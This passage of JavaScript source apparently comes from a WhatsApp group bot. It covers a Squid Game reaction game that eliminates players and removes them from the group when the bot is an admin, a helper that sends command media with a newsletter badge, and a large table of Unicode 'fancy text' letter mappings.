    const meta = await sock.groupMetadata(remoteJid);
    participants = meta.participants.map(p => p.id).filter(id => id !== sock.user?.id && id !== senderJid);
  } catch(e) {
    await sock.sendMessage(remoteJid, { text: '❌ Unable to fetch group members.' });
    return;
  }

  if (participants.length < 4) {
    await sock.sendMessage(remoteJid, { text: '❌ At least 4 members needed to play!' });
    return;
  }

  // Init état
  gameState.set(remoteJid, {
    type: 'squidgame',
    data: {
      players: new Set(participants),     // players still alive
      eliminated: new Set(),              // eliminated
      roundIndex: 0,
      reactions: new Map(),               // senderJid → emoji
      roundActive: false,
      host: senderJid,
      startTime: Date.now()
    }
  });

  const mentions = participants.slice(0, 20); // max 20 mentions
  await sock.sendMessage(remoteJid, {
    text: `🦑 *SQUID GAME COMMENCE!*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `👥 *${participants.length} participant(s)* enregistrés!\n` +
      `🎯 Survive all rounds to win!\n\n` +
      `📋 *Règles:*\n` +
      `• Réagissez with le bon emoji quand demandé\n` +
      `• 🟢 = Good action | 🔴 = Wrong action\n` +
      `• Si 3 rounds without reaction → 10 players kicked\n` +
      `• 4 good reactions = round protection\n\n` +
      `⏳ *Round 1 starts in 5 seconds...*\n\n` +
      `${participants.slice(0,20).map(p => `@${p.split('@')[0]}`).join(' ')}`,
    mentions
  });

  setTimeout(() => startSquidRound(sock, remoteJid), 5000);
}

async function startSquidRound(sock, remoteJid) {
  const state = gameState.get(remoteJid);
  if (!state || state.type !== 'squidgame') return;

  const { roundIndex, players, eliminated } = state.data;

  if (roundIndex >= SQUID_ROUNDS.length || players.size === 0) {
    await endSquidGame(sock, remoteJid, state);
    return;
  }

  const round = SQUID_ROUNDS[roundIndex];
  state.data.reactions  = new Map();
  state.data.roundActive = true;

  const alive = [...players];
  const mentions = alive.slice(0, 20);

  await sock.sendMessage(remoteJid, {
    text: `🦑 *ROUND ${roundIndex + 1}: ${round.name}*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `${round.instruction}\n\n` +
      `👥 Players remaining: *${players.size}*\n` +
      `⏱️ You have *${round.duration / 1000} seconds!*\n\n` +
      `${alive.slice(0,20).map(p => `@${p.split('@')[0]}`).join(' ')}`,
    mentions
  });

  // Timer de fin de round
  setTimeout(() => endSquidRound(sock, remoteJid, round), round.duration);
}

async function processSquidReaction(sock, message, text, remoteJid, senderJid, state) {
  const { roundActive, players, reactions } = state.data;
  if (!roundActive) return;
  if (!players.has(senderJid)) return; // Déjà éliminé

  const emoji = text.trim();
  if (emoji === '🟢' || emoji === '🔴') {
    reactions.set(senderJid, emoji);
  }
}

async function endSquidRound(sock, remoteJid, round) {
  const state = gameState.get(remoteJid);
  if (!state || state.type !== 'squidgame') return;

  state.data.roundActive = false;
  const { players, reactions, eliminated, roundIndex } = state.data;

  const goodReactions  = [...reactions.entries()].filter(([,e]) => e === round.target).map(([j]) => j);
  const wrongReactions = [...reactions.entries()].filter(([,e]) => e === round.wrong).map(([j]) => j);
  const noReaction     = [...players].filter(j => !reactions.has(j));

  // Éliminer ceux qui ont réagi with le mauvais emoji
  wrongReactions.forEach(j => { players.delete(j); eliminated.add(j); });

  let resultText = `📊 *RÉSULTAT ROUND ${roundIndex + 1}*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
  resultText += `✅ Good reactions: *${goodReactions.length}*\n`;
  resultText += `❌ Wrong reactions: *${wrongReactions.length}*\n`;
  resultText += `😶 No reaction: *${noReaction.length}*\n\n`;

  // Règle: si 0 bonne réaction sur 3 rounds consécutifs → expulser 10
  state.data.noReactionStreak = (state.data.noReactionStreak || 0);
  if (goodReactions.length === 0) {
    state.data.noReactionStreak++;
    if (state.data.noReactionStreak >= 3) {
      // Expulser 10 joueurs aléatoires
      const toKick = [...players].sort(() => Math.random() - 0.5).slice(0, Math.min(10, players.size));
      toKick.forEach(j => { players.delete(j); eliminated.add(j); });
      resultText += `☠️ *3 rounds without reaction! 10 players kicked!*\n`;
      resultText += toKick.map(j => `• @${j.split('@')[0]}`).join('\n') + '\n\n';
      state.data.noReactionStreak = 0;

      try {
        const botIsAdmin = await isBotGroupAdmin(sock, remoteJid);
        if (botIsAdmin) {
          for (const jid of toKick) {
            await sock.groupParticipantsUpdate(remoteJid, [jid], 'remove').catch(() => {});
            await delay(500);
          }
        }
      } catch(e) {}
    }
  } else if (goodReactions.length >= 4) {
    // Protection: les 4+ premiers protégés ce round
    state.data.noReactionStreak = 0;
    resultText += `🛡️ *${goodReactions.length} joueurs ont réagi correctement → protégés ce round!*\n\n`;
  } else {
    state.data.noReactionStreak = 0;
  }

  // Expulser les mauvaises réactions du groupe
  if (wrongReactions.length > 0) {
    try {
      const botIsAdmin = await isBotGroupAdmin(sock, remoteJid);
      if (botIsAdmin) {
        for (const jid of wrongReactions) {
          await sock.groupParticipantsUpdate(remoteJid, [jid], 'remove').catch(() => {});
          await delay(500);
        }
      }
    } catch(e) {}
    resultText += `🚪 *Eliminated:*\n${wrongReactions.map(j => `• @${j.split('@')[0]}`).join('\n')}\n\n`;
  }

  resultText += `👥 *Survivors: ${players.size}*\n`;

  const allMentions = [...goodReactions, ...wrongReactions, ...noReaction].slice(0, 20);
  await sock.sendMessage(remoteJid, { text: resultText, mentions: allMentions });

  state.data.roundIndex++;

  if (players.size <= 1) {
    await endSquidGame(sock, remoteJid, state);
    return;
  }

  await delay(4000);
  await startSquidRound(sock, remoteJid);
}

async function endSquidGame(sock, remoteJid, state) {
  gameState.delete(remoteJid);
  const { players, eliminated } = state.data;

  const winners = [...players];
  const winMentions = winners.slice(0, 10);

  await sock.sendMessage(remoteJid, {
    text: `🦑 *SQUID GAME TERMINÉ!*\n━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `${winners.length > 0
        ? `🏆 *${winners.length} GAGNANT(S):*\n${winners.map(j => `👑 @${j.split('@')[0]}`).join('\n')}`
        : '☠️ *Tous les joueurs ont été eliminated!*'
      }\n\n` +
      `📊 Eliminated: ${eliminated.size}\n` +
      `🎮 Rounds joués: ${state.data.roundIndex}\n\n` +
      `_Thanks for playing Squid Game!_ 🦑`,
    mentions: winMentions
  });
}

// =============================================
// 🖼️ SYSTÈME D'IMAGES PAR COMMANDE
// =============================================
// Place une image dans le dossier du bot nommée:
//   ping.jpg, alive.jpg, info.jpg, sticker.jpg...
// Le bot l'enverra automatiquement en caption!
// Formats supportés: .jpg .jpeg .png .gif .webp
// =============================================

// =============================================
// 🔧 BUILD META QUOTE — Crée un message cité stylé
// =============================================
function buildMetaQuote(latencyMs = null) {
  return null;
}

// =============================================
// 🏅 BADGE CONTEXT — Contexte avec badge stylé
// =============================================
function buildBadgeCtx() {
  const BADGE_CTX = {
    forwardingScore: 1,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: config.channelJid,
      newsletterName: config.botName,
      serverMessageId: Math.floor(Math.random() * 9000) + 1000
    },
    externalAdReply: {
      title: config.botName,
      body: '📢 Chaîne officielle',
      mediaType: 1,
      previewType: 0,
      showAdAttribution: true,
      sourceUrl: config.channelLink,
      renderLargerThumbnail: false
    }
  };
  return BADGE_CTX;
}

async function sendWithImage(sock, remoteJid, cmdName, text, mentions = [], latencyMs = null) {
  const videoExts = ['.mp4','.mov','.mkv'], imageExts = ['.jpg','.jpeg','.png','.gif','.webp'];
  let mediaPath = null, mediaType = null;
  for (const ext of videoExts) { const p=`./${cmdName}${ext}`; if(fs.existsSync(p)){mediaPath=p;mediaType='video';break;} }
  if (!mediaPath) { for (const ext of imageExts) { const p=`./${cmdName}${ext}`; if(fs.existsSync(p)){mediaPath=p;mediaType='image';break;} } }

  const mq = buildMetaQuote(latencyMs);
  const badge = buildBadgeCtx();
  const contextInfo = {
    forwardingScore: badge.forwardingScore,
    isForwarded: badge.isForwarded,
    forwardedNewsletterMessageInfo: badge.forwardedNewsletterMessageInfo,
    externalAdReply: badge.externalAdReply
  };
  const sendOpts = mq ? { quoted: mq } : {};

  let sentMsg;
  try {
    if (mediaPath && mediaType === 'video') {
      sentMsg = await sock.sendMessage(remoteJid, {
        video: fs.readFileSync(mediaPath),
        caption: text,
        gifPlayback: false,
        mentions,
        contextInfo
      }, sendOpts);
    } else if (mediaPath && mediaType === 'image') {
      sentMsg = await sock.sendMessage(remoteJid, {
        image: fs.readFileSync(mediaPath),
        caption: text,
        mentions,
        contextInfo
      }, sendOpts);
    } else {
      sentMsg = await sock.sendMessage(remoteJid, {
        text,
        mentions,
        contextInfo
      }, sendOpts);
    }
  } catch(e) {
    try { sentMsg = await sock.sendMessage(remoteJid, { text, mentions }); } catch(e2) {}
  }
  return sentMsg;
}

// =============================================
// ✨ COMMANDE FANCY — Convertir texte en styles
// Usage: !fancy [numéro] [texte]
//        !fancy [texte]  → liste tous les styles
// =============================================
async function handleFancy(sock, args, remoteJid, senderJid) {
  if (!args.length) {
    await sock.sendMessage(remoteJid, {
      text: `✨ *FANCY - Styles de texte*\n\nUsage:\n• ${config.prefix}fancy [texte] → voir tous les styles\n• ${config.prefix}fancy [numéro] [texte] → style spécifique\n\nEx: ${config.prefix}fancy CyberToji\nEx: ${config.prefix}fancy 10 CyberToji`
    });
    return;
  }

  // Détecter si le premier arg est un numéro
  const firstArg = args[0];
  let styleNum = parseInt(firstArg);
  let text;

  if (!isNaN(styleNum) && args.length > 1) {
    text = args.slice(1).join(' ');
  } else {
    styleNum = null;
    text = args.join(' ');
  }

  // Table de conversion lettre → fancy par style
  // Chaque style a un mapping complet A-Z a-z 0-9
  function applyStyle(text, styleIndex) {
    const styles = [
      // 1 - ຊ໐k໐น style Thai/Lao
      { map: {'a':'ส','b':'ც','c':'ċ','d':'ɗ','e':'ε','f':'ƒ','g':'ɠ','h':'ɦ','i':'ı','j':'ʝ','k':'ƙ','l':'ʟ','m':'๓','n':'ŋ','o':'໐','p':'ρ','q':'զ','r':'ɾ','s':'ʂ','t':'ƭ','u':'น','v':'ν','w':'ω','x':'χ','y':'ყ','z':'ʑ','A':'ส','B':'ც','C':'Ċ','D':'Ɗ','E':'Ε','F':'Ƒ','G':'Ɠ','H':'Ɦ','I':'I','J':'ʝ','K':'Ƙ','L':'Ⴊ','M':'๓','N':'Ŋ','O':'໐','P':'Ρ','Q':'Զ','R':'ɾ','S':'Ʂ','T':'Ƭ','U':'น','V':'Ν','W':'Ω','X':'Χ','Y':'Ყ','Z':'ʑ'} },
      // 2 - ʑơƙơų style
      { map: {'a':'ą','b':'ɓ','c':'ƈ','d':'ɗ','e':'ɛ','f':'ʄ','g':'ɠ','h':'ɦ','i':'ı','j':'ʝ','k':'ƙ','l':'ʟ','m':'ɱ','n':'ŋ','o':'ơ','p':'ρ','q':'զ','r':'ɾ','s':'ʂ','t':'ƭ','u':'ų','v':'ν','w':'ω','x':'χ','y':'ყ','z':'ʑ','A':'Ą','B':'Ɓ','C':'Ƈ','D':'Ɗ','E':'Ɛ','F':'ʄ','G':'Ɠ','H':'Ɦ','I':'ı','J':'ʝ','K':'Ƙ','L':'ʟ','M':'ɱ','N':'Ŋ','O':'Ơ','P':'Ρ','Q':'Զ','R':'ɾ','S':'Ʂ','T':'Ƭ','U':'Ų','V':'Ν','W':'Ω','X':'Χ','Y':'Ყ','Z':'ʑ'} },
      // 3 - 乙のズのひ Japanese
      { map: {'a':'ά','b':'乃','c':'ς','d':'∂','e':'ε','f':'ƒ','g':'g','h':'ん','i':'ι','j':'j','k':'ズ','l':'ℓ','m':'ﾶ','n':'η','o':'の','p':'ρ','q':'q','r':'尺','s':'丂','t':'τ','u':'ひ','v':'ν','w':'ω','x':'χ','y':'ソ','z':'乙','A':'ά','B':'乃','C':'ς','D':'∂','E':'Ε','F':'Ƒ','G':'G','H':'ん','I':'ι','J':'J','K':'ズ','L':'ℓ','M':'ﾶ','N':'η','O':'の','P':'Ρ','Q':'Q','R':'尺','S':'丂','T':'τ','U':'ひ','V':'Ν','W':'Ω','X':'Χ','Y':'ソ','Z':'乙'} },
      // 4 - 乙ㄖҜㄖㄩ Leet/Kanji
      { map: {'a':'ᗩ','b':'ᗷ','c':'ᑕ','d':'ᗪ','e':'ᗴ','f':'ᖴ','g':'Ǥ','h':'ᕼ','i':'ι','j':'ᒍ','k':'Ҝ','l':'ᒪ','m':'ᗰ','n':'ᑎ','o':'ㄖ','p':'ᑭ','q':'Ƣ','r':'ᖇ','s':'Ş','t':'ƬΉΣ','u':'ᑌ','v':'᙮᙮','w':'ᗯ','x':'᙭','y':'ƳΘᑌ','z':'乙','A':'ᗩ','B':'ᗷ','C':'ᑕ','D':'ᗪ','E':'ᗴ','F':'ᖴ','G':'Ǥ','H':'ᕼ','I':'ι','J':'ᒍ','K':'Ҝ','L':'ᒪ','M':'ᗰ','N':'ᑎ','O':'ㄖ','P':'ᑭ','Q':'Ƣ','R':'ᖇ','S':'Ş','T':'Ƭ','U':'ᑌ','V':'᙮᙮','W':'ᗯ','X':'᙭','Y':'Ƴ','Z':'乙'} },
      // 5 - 🅉🄾🄺🄾🅄 Enclosed letters
      { map: {'a':'🄰','b':'🄱','c':'🄲','d':'🄳','e':'🄴','f':'🄵','g':'🄶','h':'🄷','i':'🄸','j':'🄹','k':'🄺','l':'🄻','m':'🄼','n':'🄽','o':'🄾','p':'🄿','q':'🅀','r':'🅁','s':'🅂','t':'🅃','u':'🅄','v':'🅅','w':'🅆','x':'🅇','y':'🅈','z':'🅉','A':'🄰','B':'🄱','C':'🄲','D':'🄳','E':'🄴','F':'🄵','G':'🄶','H':'🄷','I':'🄸','J':'🄹','K':'🄺','L':'🄻','M':'🄼','N':'🄽','O':'🄾','P':'🄿','Q':'🅀','R':'🅁','S':'🅂','T':'🅃','U':'🅄','V':'🅅','W':'🅆','X':'🅇','Y':'🅈','Z':'🅉'} },
      // 6 - ፚᎧᏦᎧᏬ Ethiopian/Cherokee
      { map: {'a':'Ꭺ','b':'Ᏸ','c':'Ꮯ','d':'Ꭰ','e':'Ꮛ','f':'Ꭶ','g':'Ꮆ','h':'Ꮒ','i':'Ꭵ','j':'Ꮰ','k':'Ꮶ','l':'Ꮮ','m':'Ꮇ','n':'Ꮑ','o':'Ꭷ','p':'Ꭾ','q':'Ꭴ','r':'Ꮢ','s':'Ꮥ','t':'Ꮦ','u':'Ꮜ','v':'Ꮩ','w':'Ꮃ','x':'Ꮙ','y':'Ꮍ','z':'ፚ','A':'Ꭺ','B':'Ᏸ','C':'Ꮯ','D':'Ꭰ','E':'Ꮛ','F':'Ꭶ','G':'Ꮆ','H':'Ꮒ','I':'Ꭵ','J':'Ꮰ','K':'Ꮶ','L':'Ꮮ','M':'Ꮇ','N':'Ꮑ','O':'Ꭷ','P':'Ꭾ','Q':'Ꭴ','R':'Ꮢ','S':'Ꮥ','T':'Ꮦ','U':'Ꮜ','V':'Ꮩ','W':'Ꮃ','X':'Ꮙ','Y':'Ꮍ','Z':'ፚ'} },
      // 7 - ᘔOKOᑌ Canadian Aboriginal
      { map: {'a':'ᗩ','b':'ᗷ','c':'ᑕ','d':'ᗪ','e':'ᕮ','f':'ᖴ','g':'ᘜ','h':'ᕼ','i':'ᓰ','j':'ᒍ','k':'ᛕ','l':'ᒪ','m':'ᗰ','n':'ᑎ','o':'O','p':'ᑭ','q':'ᕴ','r':'ᖇ','s':'ᔕ','t':'ᗪ','u':'ᑌ','v':'ᐯ','w':'ᗯ','x':'ᘔ','y':'ᖻ','z':'ᘔ','A':'ᗩ','B':'ᗷ','C':'ᑕ','D':'ᗪ','E':'ᕮ','F':'ᖴ','G':'ᘜ','H':'ᕼ','I':'ᓰ','J':'ᒍ','K':'ᛕ','L':'ᒪ','M':'ᗰ','N':'ᑎ','O':'O','P':'ᑭ','Q':'ᕴ','R':'ᖇ','S':'ᔕ','T':'ᗪ','U':'ᑌ','V':'ᐯ','W':'ᗯ','X':'ᘔ','Y':'ᖻ','Z':'ᘔ'} },
      // 8 - ʐօӄօʊ Armenian
      { map: {'a':'ą','b':'ҍ','c':'ç','d':'ժ','e':'ҽ','f':'ƒ','g':'ց','h':'հ','i':'ì','j':'ʝ','k':'ҟ','l':'Ӏ','m':'ʍ','n':'ղ','o':'օ','p':'ρ','q':'զ','r':'ɾ','s':'ʂ','t':'է','u':'մ','v':'ѵ','w':'ա','x':'×','y':'վ','z':'ʐ','A':'Ą','B':'Ҍ','C':'Ç','D':'Ժ','E':'Ҽ','F':'Ƒ','G':'Ց','H':'Հ','I':'Ì','J':'ʝ','K':'Ҟ','L':'Ӏ','M':'ʍ','N':'Ղ','O':'Օ','P':'Ρ','Q':'Զ','R':'ɾ','S':'Ʂ','T':'Է','U':'Մ','V':'Ѵ','W':'Ա','X':'×','Y':'Վ','Z':'ʐ'} },
      // 9 - 𝚉𝚘𝚔𝚘𝚞 Monospace
      { range: [0x1D670, 0x1D689, 0x1D670] }, // handled separately
      // 10 - 𝙕𝙤𝙠𝙤𝙪 Bold Italic
      { range: [0x1D468, 0x1D481, 0x1D468] },
      // 11 - 𝐙𝐨𝐤𝐨𝐮 Bold
      { range: [0x1D400, 0x1D419, 0x1D400] },
      // 12 - 𝗭𝗼𝗸𝗼𝘂 Bold Sans
      { range: [0x1D5D4, 0x1D5ED, 0x1D5D4] },
      // 13 - 𝘡𝘰𝘬𝘰𝘶 Italic Sans
      { range: [0x1D608, 0x1D621, 0x1D608] },
      // 14 - Zσƙσυ Greek-ish
      { map: {'a':'α','b':'в','c':'¢','d':'∂','e':'є','f':'ƒ','g':'g','h':'н','i':'ι','j':'נ','k':'ƙ','l':'ℓ','m':'м','n':'η','o':'σ','p':'ρ','q':'q','r':'я','s':'ѕ','t':'т','u':'υ','v':'ν','w':'ω','x':'χ','y':'γ','z':'з','A':'Α','B':'В','C':'¢','D':'∂','E':'Є','F':'Ƒ','G':'G','H':'Η','I':'Ι','J':'נ','K':'Ƙ','L':'ℓ','M':'М','N':'Η','O':'Ω','P':'Ρ','Q':'Q','R':'Я','S':'Ѕ','T':'Τ','U':'Υ','V':'Ν','W':'Ω','X':'Χ','Y':'Υ','Z':'Ζ'} },
      // 15 - ⱫØ₭ØɄ Currency
      { map: {'a':'₳','b':'฿','c':'₵','d':'Đ','e':'Ɇ','f':'₣','g':'₲','h':'Ħ','i':'ł','j':'J','k':'₭','l':'Ⱡ','m':'₥','n':'₦','o':'Ø','p':'₱','q':'Q','r':'Ɽ','s':'$','t':'₮','u':'Ʉ','v':'V','w':'₩','x':'Ӿ','y':'Ɏ','z':'Ⱬ','A':'₳','B':'฿','C':'₵','D':'Đ','E':'Ɇ','F':'₣','G':'₲','H':'Ħ','I':'ł','J':'J','K':'₭','L':'Ⱡ','M':'₥','N':'₦','O':'Ø','P':'₱','Q':'Q','R':'Ɽ','S':'$','T':'₮','U':'Ʉ','V':'V','W':'₩','X':'Ӿ','Y':'Ɏ','Z':'Ⱬ'} },
      // 16 - Zðkðµ
      { map: {'a':'å','b':'ƀ','c':'ċ','d':'ð','e':'ê','f':'ƒ','g':'ĝ','h':'ĥ','i':'î','j':'ĵ','k':'ķ','l':'ļ','m':'m','n':'ñ','o':'ð','p':'þ','q':'q','r':'ŗ','s':'ş','t':'ţ','u':'µ','v':'v','w':'ŵ','x':'x','y':'ÿ','z':'ƶ','A':'Å','B':'Ƀ','C':'Ċ','D':'Ð','E':'Ê','F':'Ƒ','G':'Ĝ','H':'Ĥ','I':'Î','J':'Ĵ','K':'Ķ','L':'Ļ','M':'M','N':'Ñ','O':'Ð','P':'Þ','Q':'Q','R':'Ŗ','S':'Ş','T':'Ţ','U':'Ü','V':'V','W':'Ŵ','X':'X','Y':'Ÿ','Z':'Ƶ'} },
      // 17 - zσкσυ Cyrillic Greek
      { map: {'a':'α','b':'в','c':'с','d':'∂','e':'є','f':'f','g':'g','h':'н','i':'і','j':'ʝ','k':'к','l':'l','m':'м','n':'η','o':'σ','p':'р','q':'q','r':'г','s':'ѕ','t':'т','u':'υ','v':'ν','w':'ш','x':'χ','y':'у','z':'z','A':'Α','B':'В','C':'С','D':'D','E':'Є','F':'F','G':'G','H':'Н','I':'І','J':'J','K':'К','L':'L','M':'М','N':'Η','O':'Ω','P':'Р','Q':'Q','R':'Г','S':'Ѕ','T':'Т','U':'Υ','V':'Ν','W':'Ш','X':'Χ','Y':'У','Z':'Z'} },
      // 18 - ɀօҟօմ Armenian mix
      { map: {'a':'ɑ','b':'ɓ','c':'ƈ','d':'ɖ','e':'ɘ','f':'ʄ','g':'ɠ','h':'ɦ','i':'ı','j':'ʝ','k':'ҟ','l':'ʟ','m':'ɱ','n':'ɳ','o':'ɔ','p':'ρ','q':'q','r':'ɹ','s':'ʂ','t':'ƭ','u':'ʋ','v':'ʌ','w':'ɯ','x':'χ','y':'ʎ','z':'ɀ','A':'Ą','B':'Ɓ','C':'Ƈ','D':'Ɖ','E':'Ɛ','F':'ʄ','G':'Ɠ','H':'Ɦ','I':'ı','J':'ʝ','K':'Ҟ','L':'ʟ','M':'Ɱ','N':'ɳ','O':'Ɔ','P':'Ρ','Q':'Q','R':'ɹ','S':'Ʂ','T':'Ƭ','U':'Ʋ','V':'Ʌ','W':'Ɯ','X':'Χ','Y':'ʎ','Z':'ɀ'} },
      // 19 - ZӨKӨЦ Cyrillic caps
      { map: {'a':'Δ','b':'Ъ','c':'С','d':'D','e':'Є','f':'F','g':'Ǵ','h':'Н','i':'І','j':'J','k':'К','l':'Ĺ','m':'М','n':'Й','o':'Θ','p':'Р','q':'Q','r':'Я','s':'Ş','t':'Т','u':'Ц','v':'V','w':'W','x':'Х','y':'Ч','z':'Z','A':'Δ','B':'Ъ','C':'С','D':'D','E':'Є','F':'F','G':'Ǵ','H':'Н','I':'І','J':'J','K':'К','L':'Ĺ','M':'М','N':'Й','O':'Θ','P':'Р','Q':'Q','R':'Я','S':'Ş','T':'Т','U':'Ц','V':'V','W':'W','X':'Х','Y':'Ч','Z':'Z'} },
      // 20 - Subscript
      { map: {'a':'ₐ','b':'b','c':'c','d':'d','e':'ₑ','f':'f','g':'g','h':'ₕ','i':'ᵢ','j':'ⱼ','k':'ₖ','l':'ₗ','m':'ₘ','n':'ₙ','o':'ₒ','p':'ₚ','q':'q','r':'ᵣ','s':'ₛ','t':'ₜ','u':'ᵤ','v':'ᵥ','w':'w','x':'ₓ','y':'y','z':'z','A':'ₐ','B':'B','C':'C','D':'D','E':'ₑ','F':'F','G':'G','H':'ₕ','I':'ᵢ','J':'ⱼ','K':'ₖ','L':'ₗ','M':'ₘ','N':'ₙ','O':'ₒ','P':'ₚ','Q':'Q','R':'ᵣ','S':'ₛ','T':'ₜ','U':'ᵤ','V':'ᵥ','W':'W','X':'ₓ','Y':'Y','Z':'Z','0':'₀','1':'₁','2':'₂','3':'₃','4':'₄','5':'₅','6':'₆','7':'₇','8':'₈','9':'₉'} },
      // 21 - Superscript
      { map: {'a':'ᵃ','b':'ᵇ','c':'ᶜ','d':'ᵈ','e':'ᵉ','f':'ᶠ','g':'ᵍ','h':'ʰ','i':'ⁱ','j':'ʲ','k':'ᵏ','l':'ˡ','m':'ᵐ','n':'ⁿ','o':'ᵒ','p':'ᵖ','q':'q','r':'ʳ','s':'ˢ','t':'ᵗ','u':'ᵘ','v':'ᵛ','w':'ʷ','x':'ˣ','y':'ʸ','z':'ᶻ','A':'ᴬ','B':'ᴮ','C':'ᶜ','D':'ᴰ','E':'ᴱ','F':'ᶠ','G':'ᴳ','H':'ᴴ','I':'ᴵ','J':'ᴶ','K':'ᴷ','L':'ᴸ','M':'ᴹ','N':'ᴺ','O':'ᴼ','P':'ᴾ','Q':'Q','R':'ᴿ','S':'ˢ','T':'ᵀ','U':'ᵁ','V':'ᵛ','W':'ᵂ','X':'ˣ','Y':'ʸ','Z':'ᶻ','0':'⁰','1':'¹','2':'²','3':'³','4':'⁴','5':'⁵','6':'⁶','7':'⁷','8':'⁸','9':'⁹'} },
      // 22 - Thai style
      { map: {'a':'ค','b':'๖','c':'ς','d':'๔','e':'є','f':'f','g':'ﻮ','h':'h','i':'ﺎ','j':'ﻝ','k':'k','l':'l','m':'๓','n':'ห','o':'๏','p':'p','q':'q','r':'r','s':'ร','t':'t','u':'ย','v':'ν','w':'ω','x':'x','y':'ч','z':'z','A':'ค','B':'๖','C':'ς','D':'๔','E':'є','F':'F','G':'ﻮ','H':'H','I':'ﺎ','J':'ﻝ','K':'K','L':'L','M':'๓','N':'ห','O':'๏','P':'P','Q':'Q','R':'R','S':'ร','T':'T','U':'ย','V':'Ν','W':'Ω','X':'X','Y':'Ч','Z':'Z'} },
      // 23 - Double struck 𝕫𝕠𝕜𝕠𝕦
      { range: [0x1D538, 0x1D551, 0x1D538] },
      // 24 - Fraktur 𝖅𝖔𝖐𝖔𝖚
      { range: [0x1D504, 0x1D51D, 0x1D504] },
      // 25 - Negative squared 🆉🅾🅺🅾🆄
      { map: {'a':'🅰','b':'🅱','c':'🅲','d':'🅳','e':'🅴','f':'🅵','g':'🅶','h':'🅷','i':'🅸','j':'🅹','k':'🅺','l':'🅻','m':'🅼','n':'🅽','o':'🅾','p':'🅿','q':'🆀','r':'🆁','s':'🆂','t':'🆃','u':'🆄','v':'🆅','w':'🆆','x':'🆇','y':'🆈','z':'🆉','A':'🅰','B':'🅱','C':'🅲','D':'🅳','E':'🅴','F':'🅵','G':'🅶','H':'🅷','I':'🅸','J':'🅹','K':'🅺','L':'🅻','M':'🅼','N':'🅽','O':'🅾','P':'🅿','Q':'🆀','R':'🆁','S':'🆂','T':'🆃','U':'🆄','V':'🆅','W':'🆆','X':'🆇','Y':'🆈','Z':'🆉'} },
      // 26 - Script Bold 𝓩𝓸𝓴𝓸𝓾
      { range: [0x1D4D0, 0x1D4E9, 0x1D4D0] },
      // 27 - Fraktur 𝔷𝔬𝔨𝔬𝔲
      { range: [0x1D51E, 0x1D537, 0x1D51E] },
      // 28 - Fullwidth Ｚｏｋｏｕ
      { map: {'a':'ａ','b':'ｂ','c':'ｃ','d':'ｄ','e':'ｅ','f':'ｆ','g':'ｇ','h':'ｈ','i':'ｉ','j':'ｊ','k':'ｋ','l':'ｌ','m':'ｍ','n':'ｎ','o':'ｏ','p':'ｐ','q':'ｑ','r':'ｒ','s':'ｓ','t':'ｔ','u':'ｕ','v':'ｖ','w':'ｗ','x':'ｘ','y':'ｙ','z':'ｚ','A':'Ａ','B':'Ｂ','C':'Ｃ','D':'Ｄ','E':'Ｅ','F':'Ｆ','G':'Ｇ','H':'Ｈ','I':'Ｉ','J':'Ｊ','K':'Ｋ','L':'Ｌ','M':'Ｍ','N':'Ｎ','O':'Ｏ','P':'Ｐ','Q':'Ｑ','R':'Ｒ','S':'Ｓ','T':'Ｔ','U':'Ｕ','V':'Ｖ','W':'Ｗ','X':'Ｘ','Y':'Ｙ','Z':'Ｚ',' ':'　','0':'０','1':'１','2':'２','3':'３','4':'４','5':'５','6':'６','7':'７','8':'８','9':'９'} },
      // 29 - Small caps ᴢᴏᴋᴏᴜ
      { map: {'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ꜰ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'Q','r':'ʀ','s':'ꜱ','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ','A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ꜰ','G':'ɢ','H':'ʜ','I':'ɪ','J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'Q','R':'ʀ','S':'ꜱ','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ'} },
      // 30 - Italic 𝑍𝒐𝒌𝒐𝒖
      { range: [0x1D434, 0x1D44D, 0x1D434] },
      // 31 - Math bold 𝛧𝛩𝛫𝛩𝑈
      { map: {'a':'𝛼','b':'𝛽','c':'𝛾','d':'𝛿','e':'𝜀','f':'𝜁','g':'𝜂','h':'𝜃','i':'𝜄','j':'𝜅','k':'𝜆','l':'𝜇','m':'𝜈','n':'𝜉','o':'𝜊','p':'𝜋','q':'𝜌','r':'𝜍','s':'𝜎','t':'𝜏','u':'𝜐','v':'𝜑','w':'𝜒','x':'𝜓','y':'𝜔','z':'z','A':'𝛢','B':'𝛣','C':'𝛤','D':'𝛥','E':'𝛦','F':'𝛧','G':'𝛨','H':'𝛩','I':'𝛪','J':'𝛫','K':'𝛬','L':'𝛭','M':'𝛮','N':'𝛯','O':'𝛰','P':'𝛱','Q':'𝛲','R':'𝛳','S':'𝛴','T':'𝛵','U':'𝛶','V':'𝛷','W':'𝛸','X':'𝛹','Y':'𝛺','Z':'𝛻'} },
      // 32 - Math Monospace Bold 𝚭𝚯𝐊𝚯𝐔
      { map: {'a':'𝚊','b':'𝚋','c':'𝚌','d':'𝚍','e':'𝚎','f':'𝚏','g':'𝚐','h':'𝚑','i':'𝚒','j':'𝚓','k':'𝚔','l':'𝚕','m':'𝚖','n':'𝚗','o':'𝚘','p':'𝚙','q':'𝚚','r':'𝚛','s':'𝚜','t':'𝚝','u':'𝚞','v':'𝚟','w':'𝚠','x':'𝚡','y':'𝚢','z':'𝚣','A':'𝙰','B':'𝙱','C':'𝙲','D':'𝙳','E':'𝙴','F':'𝙵','G':'𝙶','H':'𝙷','I':'𝙸','J':'𝙹','K':'𝙺','L':'𝙻','M':'𝙼','N':'𝙽','O':'𝙾','P':'𝙿','Q':'𝚀','R':'𝚁','S':'𝚂','T':'𝚃','U':'𝚄','V':'𝚅','W':'𝚆','X':'𝚇','Y':'𝚈','Z':'𝚉'} },
